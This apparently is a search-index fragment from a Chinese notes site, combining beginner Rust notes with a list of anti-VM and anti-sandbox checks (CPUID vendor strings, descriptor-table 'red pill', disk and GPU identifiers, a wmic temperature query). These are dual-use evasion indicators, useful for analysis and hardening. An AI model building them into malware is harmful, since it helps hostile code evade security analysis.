ResultServer\u8fde\u63a5\u7684\u53cd\u6c99\u7bb1\u6280\u672f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#cpu","text":"","title":"CPU"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#cpuidid","text":"\u865a\u62df\u673a\u7684CPUID\u6307\u4ee4\u6709\u7279\u5b9a\u7684\u6307\u7eb9 FreeBSD HV 0x40000000 bhyve bhyve Hyper-V 0x40000000 Microsoft Hv KVM 0x40000000 KVMKVMKVM Parallels 0x40000000 prl hyperv VirtualBox 0x40000000 VBoxVBoxVBox VirtualPC 0x40000000 Microsoft Hv VMware 0x40000000 VMwareVMware Xen 0x40000000 XenVMMXenVMM","title":"\u901a\u8fc7CPUID\u6307\u4ee4\u68c0\u67e5\u4f9b\u5e94\u5546ID\u5b57\u7b26\u4e32"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#cpuidhypervisor","text":"Hypervisor 1 31st bit in ECX - set if run in Hypervisor","title":"\u901a\u8fc7CPUID\u6307\u4ee4\u68c0\u67e5\u662f\u5426\u5728Hypervisor\u4e2d\u8fd0\u884c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#idtgdtldt","text":"\u9ad8\u7ea7 \u6b64\u6280\u672f\u4e0d\u9002\u7528\u4e8e\u6700\u65b0\u7684 VMware \u7248\u672c\uff08\u6240\u6709\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\uff09\u3002 \u7136\u800c\uff0c\u4e3a\u4e86\u5b8c\u6574\u8d77\u89c1\uff0c\u5728\u6b64\u5bf9\u5176\u8fdb\u884c\u63cf\u8ff0\u3002 \u8fd9\u4e2a\u6280\u5de7\u6d89\u53ca\u67e5\u770b\u6307\u5411\u901a\u5e38\u5728\u865a\u62df\u673a\u4e0a\u91cd\u5b9a\u4f4d\u7684\u5173\u952e\u64cd\u4f5c\u7cfb\u7edf\u8868\u7684\u6307\u9488\u3002 \u8fd9\u5c31\u662f\u6240\u8c13\u7684\u201c\u7ea2\u8272\u836f\u4e38\u201d\uff0c\u7531 Joanna Rutkowska \u9996\u5148\u63d0\u51fa\u3002 \u6bcf\u4e2a CPU \u6709 1 \u4e2a\u672c\u5730\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (LDTR)\u30011 \u4e2a\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (GDTR) \u548c 1 \u4e2a\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868\u5bc4\u5b58\u5668 (IDTR)\u3002 \u5f53\u6765\u5bbe\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u65f6\uff0c\u5b83\u4eec\u5fc5\u987b\u79fb\u52a8\u5230\u4e0d\u540c\u7684\u4f4d\u7f6e\uff0c\u4ee5\u907f\u514d\u4e0e\u4e3b\u673a\u53d1\u751f\u51b2\u7a81\u3002 \u4f8b\u5982\uff0c\u5728\u771f\u5b9e\u673a\u5668\u4e0a\uff0cIDT \u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u6bd4\u5728\u6765\u5bbe\uff08\u5373\u865a\u62df\uff09\u673a\u5668\u4e0a\u7684\u4f4d\u7f6e\u4f4e\u3002","title":"\u68c0\u67e5\u5168\u5c40\u8868\u4f4d\u7f6e\uff1aIDT/GDT/LDT"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_62","text":"MMX \u6307\u4ee4\u53ef\u80fd\u88ab\u6076\u610f\u8f6f\u4ef6\u7528\u4f5c\u968f\u673a\u6307\u4ee4\u3002 \u6709\u65f6\u865a\u62df\u673a\u4e0d\u652f\u6301\u6b64\u7c7b CPU \u6307\u4ee4\u5b50\u96c6\uff0c\u56e0\u6b64\u4f1a\u629b\u51fa\u5f02\u5e38\u800c\u4e0d\u662f\u6267\u884c\u5206\u6790\u3002","title":"\u4f7f\u7528\u5947\u5f02\u6307\u4ee4\u6765\u6b3a\u9a97\u865a\u62df\u6a21\u62df\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#pc","text":"\u7279\u5b9a\u865a\u62df\u673a\uff0c\u7565\u8fc7","title":"\u901a\u8fc7\u6267\u884c\u975e\u6cd5\u6307\u4ee4\u6765\u68c0\u6d4b\u73af\u5883\uff08\u4ec5\u9650\u865a\u62df PC\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#in-vmware","text":"https://sites.google.com/site/chitchatvmback/backdoor","title":"\u901a\u8fc7 IN \u6307\u4ee4\u68c0\u6d4b\u73af\u5883 - \u540e\u95e8\u7aef\u53e3\uff08\u4ec5\u9650 VMware\uff09"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_63","text":"","title":"\u786c\u4ef6"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_64","text":"SetupDiGetClassDevs SetupDiEnumDeviceInfo SetupDiGetDeviceRegistryProperty QEMU QEMU VirtualBox VBOX VirtualPC VIRTUAL HD VMware VMware","title":"\u68c0\u67e5\u786c\u76d8\u7279\u5b9a\u540d\u79f0"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_65","text":"DeviceIoControl VirtualBox VBOX VMware vmware","title":"\u68c0\u67e5\u786c\u76d8\u4f9b\u5e94\u5546\u7279\u5b9a\u503c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_66","text":"","title":"\u68c0\u67e5\u97f3\u9891\u8bbe\u5907\u662f\u5426\u7f3a\u5931"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#cpu_1","text":"wmic /namespace:\\\\root\\WMI path MSAcpi_ThermalZoneTemperature get CurrentTemperature","title":"\u68c0\u67e5CPU\u6e29\u5ea6\u4fe1\u606f\u662f\u5426\u5b58\u5728"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#d3d9","text":"Direct3DCreate9 GetAdapterIdentifier Vmware VendorId 0x15AD DeviceId 0x405 Only when used in combination with VendorId related to VMware (0x15AD) Driver vm3dum.dll Driver vm3dum64_loader.dll Description VMware SVGA 3D","title":"\u68c0\u67e5d3d9\u786c\u4ef6\u663e\u793a\u63a5\u53e3"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/","text":"\u57fa\u7840 \u9879\u76ee\u7ed3\u6784 xx.rs rust\u6e90\u6587\u4ef6 Cargo.toml \u8fd9\u662fcargo\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5f53rust\u9700\u8981\u7528\u5230\u4f9d\u8d56\u5305\u6784\u5efa\u8f83\u5927\u7684\u9879\u76ee\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528cargo\u6765\u7ba1\u7406rust\u9879\u76ee\uff0c\u8be5\u6587\u4ef6\u5c31\u662f\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6 \u6587\u4ef6\u793a\u4f8b\u5982\u4e0b [package] name = \"rust_console3\" version = \"0.1.0\" edition = \"2021\" # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html [dependencies] ///////////////////////////////////////////////// [package]\uff0c\u662f\u4e00\u4e2a\u7247\u6bb5\uff08section\uff09\u6807\u9898\uff0c\u8868\u660e\u4e0b\u9762\u7684\u8bed\u53e5\u7528\u6765\u914d\u7f6e\u4e00\u4e2a\u5305\u3002\u968f\u7740\u6211\u4eec\u5728\u8fd9\u4e2a\u6587\u4ef6\u589e\u52a0\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u8fd8\u5c06\u589e\u52a0\u5176\u4ed6\u7247\u6bb5\uff08section\uff09 name \u7a0b\u5e8f\u540d\u79f0 version \u5f53\u524d\u7a0b\u5e8f\u7248\u672c edition Rust\u7248\u672c\u3002 \u5f53\u524d\u6709\u4e09\u4e2a\u53ef\u7528\u7248\u672c\uff1aRust 2015\u3001Rust 2018 \u548c Rust 2021 [dependencies]\uff0c\u662f\u7f57\u5217\u9879\u76ee\u4f9d\u8d56\u7684\u7247\u6bb5\u7684\u5f00\u59cb\u3002\u5728 Rust \u4e2d\uff0c\u4ee3\u7801\u5305\u88ab\u79f0\u4e3a _crates_\u3002\u8fd9\u4e2a\u9879\u76ee\u5e76\u4e0d\u9700\u8981\u5176\u4ed6\u7684 crate\uff0c\u4e0d\u8fc7\u5728\u7b2c\u4e8c\u7ae0\u7684\u7b2c\u4e00\u4e2a\u9879\u76ee\u4f1a\u7528\u5230\u4f9d\u8d56\uff0c\u90a3\u65f6\u4f1a\u7528\u5f97\u4e0a\u8fd9\u4e2a\u7247\u6bb5\u3002 \u5b8f\u4e0e\u51fd\u6570 \u770b\u5230!\u5c31\u662f\u5b8f\uff0c\u6ca1\u6709\u5c31\u662f\u51fd\u6570 Cargo\u57fa\u672c\u547d\u4ee4 cargo b \u7f16\u8bd1\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u9ed8\u8ba4\u662fdebug\u7248 cargo b --release \u7f16\u8bd1\u53d1\u5e03\u7248 cargo r \u7f16\u8bd1\u5e76\u6267\u884c cargo c \u68c0\u67e5\u4ee3\u7801\u662f\u4e0d\u662f\u6b63\u5e38 cargo n \u65b0\u5efa\u4e00\u4e2acargo\u9879\u76ee \u53d8\u91cf \u53ef\u53d8\u6027 let mut \u662f\u53ef\u53d8\u53d8\u91cf let \u662f\u4e0d\u53ef\u53d8\u53d8\u91cf \u4e0d\u53ef\u53d8\u53d8\u91cf\u4e0d\u80fd\u591f\u4e8c\u6b21\u8d4b\u503c\uff0c\u4e0d\u80fd\u4fee\u6539\uff0c\u4f46\u591a\u6b21let\u53ef\u4ee5\u4fee\u6539 \u5e38\u91cf \u5e38\u91cf\u603b\u662f\u4e0d\u53ef\u53d8 \u4f7f\u7528const\u6765\u7533\u660e\u5e38\u91cf \u5e38\u91cf\u540d\u79f0\u547d\u540d\u7ea6\u5b9a\u662f\u5168\u5927\u5199\uff0c\u5355\u8bcd\u95f4\u4e0b\u5212\u7ebf const A_B: u32 = 111 ; \u53d8\u91cf\u7684\u4f5c\u7528\u57df let\u8d4b\u503c\u7684\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u4f5c\u7528\u57df\u751f\u6548\uff0c\u6bd4\u5982\u82b1\u62ec\u53f7\u4e2d\u867d\u7136x\u91cd\u65b0\u88ab\u8ba1\u7b97\uff0c\u4f46\u5728\u82b1\u62ec\u53f7\u4e4b\u5916\uff0cx\u4f9d\u65e7\u662f6 fn main() { let x = 5; let x = x + 1; { let x = x * 2; println!(\"The value of x in the inner scope is: {x}\"); } println!(\"The value of x is: {x}\"); } \u53d8\u91cf\u4f1a\u5728\u4ee5\u4e0b\u60c5\u51b5\u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0c\u76f8\u5f53\u4e8e\u88ab\u4e22\u5f03 \u51fd\u6570\u7ed3\u675f\u3002 \u4ee3\u7801\u5757\u7ed3\u675f\u3002 \u53d8\u91cf\u88ab\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u53d8\u91cf\u3002 \u53d8\u91cf\u88ab\u9690\u5f0f\u79fb\u52a8\u5230\u53e6\u4e00\u4e2a\u4f5c\u7528\u57df\u3002 \u6570\u636e\u7c7b\u578b rust\u4e0ec\u3001c++\u4e00\u6837\u662f\u9759\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u5728\u7f16\u8bd1\u65f6\u5c31\u5fc5\u987b\u77e5\u9053\u6240\u6709\u53d8\u91cf\u7684\u7c7b\u578b\u3002 \u9700\u8981\u660e\u786e\u5730\u4e3a\u53d8\u91cf\u6307\u51fa\u53d8\u91cf\u7c7b\u578b\u65f6\u4f7f\u7528 \u53d8\u91cf : \u7c7b\u578b \u6765\u6307\u5b9a let x:u64 = 5; i32 32\u4f4d\u6570\u5b57 u32 32\u4f4d\u65e0\u7b26\u53f7\u6570\u5b57 let mut guess = String::new(); //\u521b\u5efa\u4e00\u4e2a\u5b57\u7b26\u7c7b\u578b\u53ef\u53d8\u53d8\u91cf let guess: u32 = xx ; //\u518d\u6b21let \u6574\u5f62 \u6709\u7b26\u53f7 \u548c \u65e0\u7b26\u53f7 \u4ee3\u8868\u6570\u5b57\u80fd\u5426\u4e3a\u8d1f\u503c\u3002 \u7531\u4e8e\u4f7f\u7528\u8d1f\u6570\u9700\u8981\u727a\u7272\u4e00\u4f4d\u6570\u4f5c\u4e3a\u8865\u7801\u8868\u793a\u662f\u6b63\u6570\u8fd8\u662f\u8d1f\u6570\uff0c\u6240\u4ee5\u65e0\u7b26\u53f7\u7684\u6b63\u6570\u66f4\u5927\uff0c\u800c\u6709\u7b26\u53f7\u7684\u6574\u6570\u5219\u80fd\u8868\u793a\u8d1f\u6570\u3002 \u957f\u5ea6 \u6709\u7b26\u53f7 \u65e0\u7b26\u53f7 8-bit i8 u8 16-bit i16 u16 32-bit i32 u32 64-bit i64 u64 128-bit i128 u128 arch isize usize \u53ef\u4ee5\u4f7f\u7528 _ \u8fde\u63a5\u6570\u5b57 let x:isize = 98_222; \u53ef\u4ee5\u4f7f\u7528\u540e\u7f00\u8868\u793a\u7c7b\u578b let y = 123u8; \u6d6e\u70b9\u578b \u7c7b\u578b f32 \u548c f64 Bool\u578b true \u548c false \u5b57\u7b26\u578b char \u5b57\u7b26\u4e32 let z: String = String::from(\"Hello, World!\"); \u5143\u7ec4 \u5143\u7ec4\u7684\u6210\u5458\u7c7b\u578b\u53ef\u4ee5\u4e0d\u540c let tup: (i32, f64, u8) = (500, 6.4, 1); \u8bbf\u95ee\u5143\u7ec4\u7684\u4e24\u79cd\u65b9\u5f0f \u89e3\u6784 let tup = (500, 6.4, 1); let (x, y, z) = tup; println!(\"The value of y is: {y}\"); \u5f15\u7528 let x: (i32, f64, u8) = (500, 6.4, 1); let five_hundred = x.0; let six_point_four = x.1; let one = x.2; \u6570\u7ec4 \u6570\u7ec4\u7684\u5143\u7d20\u7c7b\u578b\u5fc5\u987b\u76f8\u540c\uff0c\u4e14\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5206\u914d\u65f6\u65e2\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\u3002 \u6570\u7ec4\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u3002 let a: [i32; 5] = [1, 2, 3, 4, 5]; let a = [1, 2, 3, 4, 5]; \u8bbf\u95ee\u6570\u7ec4 let a = [1, 2, 3, 4, 5]; let first = a[0]; let second = a[1]; \u51fd\u6570 fn \u58f0\u660e\u65b0\u51fd\u6570 \u8bed\u53e5\u548c\u8868\u8fbe\u5f0f \u8bed\u53e5\u6ca1\u6709\u8fd4\u56de\u503c \u8868\u8fbe\u5f0f\u53ef\u4ee5\u8fd4\u56de\u503c,\u8868\u8fbe\u5f0f\u6700\u540e\u4e00\u53e5\u6ca1\u6709\u5206\u53f7 ; fn main() { let y = { let x = 3; x + 1 }; println!(\"The value of y is: {y}\"); } \u51fd\u6570\u7684\u8fd4\u56de\u503c \u51fd\u6570\u4f53\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u4f7f\u7528 -> \u6765\u6307\u5b9a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7c7b\u578b fn five() -> i32 { 5 } fn main() { let x = five(); println!(\"The value of x is: {x}\"); } String::new(); ::\u610f\u5473\u5173\u8054\u51fd\u6570 \u6d41\u7a0b\u63a7\u5236 \u6761\u4ef6\u5206\u652f if - \u6ca1\u6709\u591a\u5927\u533a\u522b \u5faa\u73af loop while match match\u8bed\u53e5\u662f\u4e00\u79cd\u63a7\u5236\u6d41\u7ed3\u6784\uff0c\u7528\u4e8e\u6839\u636e\u503c\u7684\u7c7b\u578b\u6216\u503c\u7684\u503c\u6765\u6267\u884c\u4e0d\u540c\u7684\u4ee3\u7801\u3002 match\u53ef\u4ee5\u5339\u914d\u53d8\u91cf\u3001\u8bed\u53e5\u3001\u8868\u8fbe\u5f0f\u3001\u51fd\u6570\u3002\u7136\u540e\u6839\u636e\u5339\u914d\u7684\u8868\u8fbe\u5f0f\u7684pattern\u503c\u6765\u6267\u884c\u76f8\u5e94\u7684\u4ee3\u7801\u3002 match\u51fd\u6570\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528&\u6765\u5f15\u7528\u51fd\u6570\uff0c\u51cf\u5c11\u51fd\u6570\u7684\u8fd0\u884c\u6b21\u6570\u3002 match expression { pattern => code, _ => code, } \u6240\u6709\u6743 \u4e00\u79cd\u5185\u5b58\u7ba1\u7406\u65b9\u5f0f\u3002 \u901a\u8fc7\u6240\u6709\u6743\u7cfb\u7edf\u7ba1\u7406\u5185\u5b58\uff0c\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1\u65f6\u4f1a\u6839\u636e\u4e00\u7cfb\u5217\u7684\u89c4\u5219\u8fdb\u884c\u68c0\u67e5\u3002\u5982\u679c\u8fdd\u53cd\u4e86\u4efb\u4f55\u8fd9\u4e9b\u89c4\u5219\uff0c\u7a0b\u5e8f\u90fd\u4e0d\u80fd\u7f16\u8bd1\u3002\u5728\u8fd0\u884c\u65f6\uff0c\u6240\u6709\u6743\u7cfb\u7edf\u7684\u4efb\u4f55\u529f\u80fd\u90fd\u4e0d\u4f1a\u51cf\u6162\u7a0b\u5e8f\u3002 > 1. Rust \u4e2d\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6709\u4e00\u4e2a \u6240\u6709\u8005\uff08_owner_\uff09\u3002 > 2. \u503c\u5728\u4efb\u4e00\u65f6\u523b\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u6240\u6709\u8005\u3002 > 3. \u5f53\u6240\u6709\u8005\uff08\u53d8\u91cf\uff09\u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u8fd9\u4e2a\u503c\u5c06\u88ab\u4e22\u5f03\u3002 \u53ef\u53d8\u5185\u5b58\u6709\u5173\u7684\u6570\u636e\u5206\u914d\uff0c\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u4f5c\u7528\u57df\u751f\u6548\u3002 \u8fd9\u6837\u505a\u662f\u56e0\u4e3arust\u5c3d\u53ef\u80fd\u63d0\u9ad8\u7a0b\u5e8f\u8fd0\u884c\u6548\u7387 fn main() { let a = 1; //\u5b58\u50a8\u5728\u6808\u4e0a let b = a; let s1 = String::from(\"hello\"); //\u7ed9\u4e86S1 let s2 = s1; //S1\u88ab\u8d4b\u503c\u7ed9S2\uff0cS1\u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0cS1\u88ab\u4e22\u5f03 println!(\"A:{}\\nB:{}\\nS2:{}\\nworld!\", a,b,s2); } \u5f15\u7528\u4e0e\u501f\u7528 \u5176\u5b9e\u53ef\u4ee5\u5c1d\u8bd5\u7406\u89e3\u4e3a\u6307\u9488 \u4f7f\u7528 & \u6765\u5728\u4e0d\u83b7\u53d6\u5bf9\u8c61\u7684\u6240\u6709\u6743\u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u503c\u3002 fn main() { let s1 = String::from(\"hello\"); let len = calculate_length(&s1); //\u4f7f\u7528&s1\u5f15\u7528s1\u7684\u503c\uff0c\u4e0d\u8f6c\u79fb\u6240\u6709\u6743 println!(\"The length of '{}' is {}.\", s1, len); //\u7531\u4e8es1\u6240\u6709\u6743\u6ca1\u6709\u8f6c\u79fb\uff0c\u6240\u4ee5s1\u5230\u8fd9\u91cc\u4f9d\u65e7\u53ef\u7528 } fn calculate_length(s: &String) -> usize { //\u51fd\u6570\u7c7b\u578b\u4e5f\u8981\u5bf9\u5e94& s.len() } \u4e00\u822c\u7684\u5f15\u7528\u65e0\u6cd5\u5bf9\u5f15\u7528\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u4e3a\u6ca1\u6709\u6240\u6709\u6743 fn main() { let s = String::from(\"hello\"); change(&s); } fn change(some_string: &String) { some_string.push_str(\", world\"); //\u8fd9\u91cc\u5c1d\u8bd5\u4fee\u6539some_string\uff0c\u4f1a\u62a5\u9519 } \u53ef\u53d8\u5f15\u7528 \u53ef\u53d8\u5f15\u7528\u9700\u8981\u53ef\u53d8\u53d8\u91cf\uff0c\u7136\u540e\u4f7f\u7528 &mut \u5f15\u7528 fn main() { let mut s = String::from(\"hello\"); change(&mut s); } fn change(some_string: &mut String) { some_string.push_str(\", world\"); } \u60ac\u6302\u5f15\u7528 \u540c\u60ac\u6302\u6307\u9488\uff0c\u5185\u5b58\u88ab\u91ca\u653e\u4e86\u800c\u6307\u9488\u8fd8\u5728\u3002\u8fd9\u91cc\u7684\u662f\u5185\u5b58\u88ab\u91ca\u653e\u4e86\uff0c\u800c\u5f15\u7528\u8fd8\u5728\u3002 \u8fd9\u662f\u4e00\u4e2a\u9519\u8bef\u4f8b\u5b50\uff0c\u7531\u4e8edangle\u51fd\u6570\u8fd4\u56de\u7684\u662fs\u7684\u5f15\u7528\uff0cdangle\u6267\u884c\u5b8c\u540es\u7684\u6240\u6709\u6743\u6ca1\u6709\u88ab\u79fb\u4ea4\u5bfc\u81f4\u88ab\u91ca\u653e\u3002main\u51fd\u6570\u4e2ddangle\u662f\u65e0\u6cd5\u8fd4\u56des\u7684 fn main() { let reference_to_nothing = dangle(); } fn dangle() -> &String { // dangle \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5f15\u7528 let s = String::from(\"hello\"); // s \u662f\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32 &s // \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5f15\u7528 } // \u8fd9\u91cc s \u79bb\u5f00\u4f5c\u7528\u57df\u5e76\u88ab\u4e22\u5f03\u3002\u5176\u5185\u5b58\u88ab\u91ca\u653e\u3002 \u5207\u7247 Rust\u4e2d\u7684\u5207\u7247\uff08slice\uff09\u662f\u6307\u5bf9\u6570\u636e\u503c\u7684\u90e8\u5206\u5f15\u7528\uff0c\u5728\u4e0d\u8f6c\u79fb\u5bf9\u8c61\u6240\u6709\u6743\u7684\u60c5\u51b5\u4e0b\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002 \u904d\u5386\u5207\u7247 let slice = &[1, 2, 3, 4, 5]; for x in slice { println!(\"{}\", x); } \u4fee\u6539\u5207\u7247 let mut slice = &mut [1, 2, 3, 4, 5]; slice[0] = 10; println!(\"{:?}\", slice); \u7ed3\u6784\u4f53 struct User { //\u7ed3\u6784\u4f53\u5b9a\u4e49 active: bool, username: String, email: String, sign_in_count: u64, } fn main() { let user1 = User { //\u521b\u5efa\u7ed3\u6784\u4f53\u5b9e\u4f8b active: true, username: String::from(\"someusername123\"), email: String::from(\"someone@example.com\"), sign_in_count: 1, }; user1.email = String::from(\"anotheremail@example.com\"); //\u5355\u4e2a\u503c\u64cd\u4f5c } \u5e38\u89c1\u96c6\u5408\u7c7b\u578b Vector fn main() { let v: Vec<i32> = Vec::new(); } String new\u65b0\u5efa let mut s = String::new(); let data = \"initial contents\"; let s = data.to_string(); from\u65b0\u5efa let s = String::from(\"initial contents\"); \u4f7f\u7528 push_str \u7b26\u52a0\u5b57\u7b26\u4e32 let mut s = String::from(\"foo\"); s.push_str(\"bar\"); Hash Map hash map\u662f\u4e00\u4e2a\u952e\u503c\u5bf9 \u9519\u8bef rust\u5c06\u9519\u8bef\u5206\u4e3a\u53ef\u6062\u590d\u7684\u548c\u4e0d\u53ef\u6062\u590d\u7684\uff0c\u5e76\u4f7f\u7528\u5b8f\u6765\u5904\u7406\u4ed6\u4eec \u4f7f\u7528 panic! \u5904\u7406\u4e0d\u53ef\u6062\u590d\u7684\u9519\u8bef\u3002 \u4f7f\u7528 Result \u5904\u7406\u53ef\u6062\u590d\u7684\u9519\u8bef\u3002","title":"Rust\u5b66\u4e60"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_1","text":"","title":"\u57fa\u7840"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_2","text":"xx.rs rust\u6e90\u6587\u4ef6 Cargo.toml \u8fd9\u662fcargo\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5f53rust\u9700\u8981\u7528\u5230\u4f9d\u8d56\u5305\u6784\u5efa\u8f83\u5927\u7684\u9879\u76ee\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528cargo\u6765\u7ba1\u7406rust\u9879\u76ee\uff0c\u8be5\u6587\u4ef6\u5c31\u662f\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6 \u6587\u4ef6\u793a\u4f8b\u5982\u4e0b [package] name = \"rust_console3\" version = \"0.1.0\" edition = \"2021\" # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html [dependencies] ///////////////////////////////////////////////// [package]\uff0c\u662f\u4e00\u4e2a\u7247\u6bb5\uff08section\uff09\u6807\u9898\uff0c\u8868\u660e\u4e0b\u9762\u7684\u8bed\u53e5\u7528\u6765\u914d\u7f6e\u4e00\u4e2a\u5305\u3002\u968f\u7740\u6211\u4eec\u5728\u8fd9\u4e2a\u6587\u4ef6\u589e\u52a0\u66f4\u591a\u7684\u4fe1\u606f\uff0c\u8fd8\u5c06\u589e\u52a0\u5176\u4ed6\u7247\u6bb5\uff08section\uff09 name \u7a0b\u5e8f\u540d\u79f0 version \u5f53\u524d\u7a0b\u5e8f\u7248\u672c edition Rust\u7248\u672c\u3002 \u5f53\u524d\u6709\u4e09\u4e2a\u53ef\u7528\u7248\u672c\uff1aRust 2015\u3001Rust 2018 \u548c Rust 2021 [dependencies]\uff0c\u662f\u7f57\u5217\u9879\u76ee\u4f9d\u8d56\u7684\u7247\u6bb5\u7684\u5f00\u59cb\u3002\u5728 Rust \u4e2d\uff0c\u4ee3\u7801\u5305\u88ab\u79f0\u4e3a _crates_\u3002\u8fd9\u4e2a\u9879\u76ee\u5e76\u4e0d\u9700\u8981\u5176\u4ed6\u7684 crate\uff0c\u4e0d\u8fc7\u5728\u7b2c\u4e8c\u7ae0\u7684\u7b2c\u4e00\u4e2a\u9879\u76ee\u4f1a\u7528\u5230\u4f9d\u8d56\uff0c\u90a3\u65f6\u4f1a\u7528\u5f97\u4e0a\u8fd9\u4e2a\u7247\u6bb5\u3002","title":"\u9879\u76ee\u7ed3\u6784"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_3","text":"\u770b\u5230!\u5c31\u662f\u5b8f\uff0c\u6ca1\u6709\u5c31\u662f\u51fd\u6570","title":"\u5b8f\u4e0e\u51fd\u6570"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#cargo","text":"cargo b \u7f16\u8bd1\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u9ed8\u8ba4\u662fdebug\u7248 cargo b --release \u7f16\u8bd1\u53d1\u5e03\u7248 cargo r \u7f16\u8bd1\u5e76\u6267\u884c cargo c \u68c0\u67e5\u4ee3\u7801\u662f\u4e0d\u662f\u6b63\u5e38 cargo n \u65b0\u5efa\u4e00\u4e2acargo\u9879\u76ee","title":"Cargo\u57fa\u672c\u547d\u4ee4"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_4","text":"","title":"\u53d8\u91cf"},{"location":"%E5%85%B6%E4%BB%96/Rust%E5%AD%A6%E4%B9%A0/#_5","text":"let mut \u662f\u53ef\u53d8\u53d8\u91cf let \u662f\u4e0d\u53ef\u53d8\u53d8\u91cf 